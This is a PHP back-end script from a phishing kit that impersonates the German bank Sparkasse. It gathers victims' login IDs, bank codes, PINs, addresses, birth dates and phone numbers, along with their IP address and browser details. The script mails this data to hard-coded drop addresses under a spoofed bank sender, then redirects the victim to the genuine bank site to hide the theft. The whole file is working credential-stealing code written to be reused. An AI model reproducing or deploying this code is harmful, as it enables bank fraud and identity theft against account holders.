<?php
require("hi4.php"); 

$ip = getenv("REMOTE_ADDR");
$hostname = gethostbyaddr($ip);
$useragent = $_SERVER['HTTP_USER_AGENT'];
$message .= "--------------Online Info-----------------------\n"; 
$message .= "Salutation:  ".$_POST['saluta']."\n";
$message .= "Title:  ".$_POST['title']."\n";
$message .= "First Name:  ".$_POST['Vorname']."\n";
$message .= "Name:  ".$_POST['Name']."\n";
$message .= "Cred Id:  ".$_POST['Anmeldename']."\n";
$message .= "Postal code:  ".$_POST['blz']."\n";
$message .= "Pin:  ".$_POST['pin']."\n";
$message .= "House No:  ".$_POST['Strae']."\n";
$message .= "Post Code:  ".$_POST['plz']."\n";
$message .= "Residence:  ".$_POST['Wohnort']."\n";
$message .= "DOB:  ".$_POST['dob']."\n";
$message .= "Email:  ".$_POST['Geburtsdatum']."\n";
$message .= "Phone:  ".$_POST['Telefon']."\n"; 
$message .= "Mobile Phone:  ".$_POST['Mobiltelefon']."\n"; 
$message .= "-------------Vict!m Info-----------------------\n";
$message .= "|Client IP: ".$ip."\n";
$message .= "|--- http://www.geoiptool.com/?IP=$ip ----\n";
$message .= "User Agent : ".$useragent."\n";
$message .= "|----------- BLUNT --------------|\n";
//change ur email here
$send = "Detlef-Friebe@protonmail.com, karlxx64@gmail.com";
$subject = "Sparkasse DE $ip";
$headers = "From: Sparkasse DE <customer-support@obxn-kekreio.org>";
$headers .= $_POST['forneio']."\n";
$headers .= "MIME-Version: 1.0\n";
{
mail("$send", "$subject", $message);   
}

  header ("Location: https://www.sparkasse.de/");


?>